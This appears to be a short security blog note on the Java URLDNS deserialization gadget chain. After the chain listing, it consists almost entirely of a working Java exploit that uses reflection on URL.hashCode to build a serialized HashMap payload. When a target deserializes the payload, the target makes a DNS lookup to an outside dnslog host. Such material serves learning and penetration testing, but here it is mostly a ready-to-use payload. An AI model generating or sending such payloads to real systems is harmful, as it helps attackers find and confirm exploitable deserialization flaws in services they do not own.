---
title: URLDNS
date: 2026-02-03 17:29:24
updated: 2026-02-04 11:58:30
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
```java
/*	Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
 */
```

# EXP

```java
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception {

        Class<URL> urlClass = URL.class;
        Field hashCode = urlClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);

        URL url = new URL("http://54d7a6a2.log.dnslog.qzz.io.");//private int hashCode=-1;
        HashMap<URL, Object> hashMap = new HashMap<URL, Object>();
        hashCode.set(url, 123);

        hashMap.put(url, 1);//put后hashCode != -1

        hashCode.set(url, -1);

        serialize(hashMap);
        //unserialize("bin.ser");
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```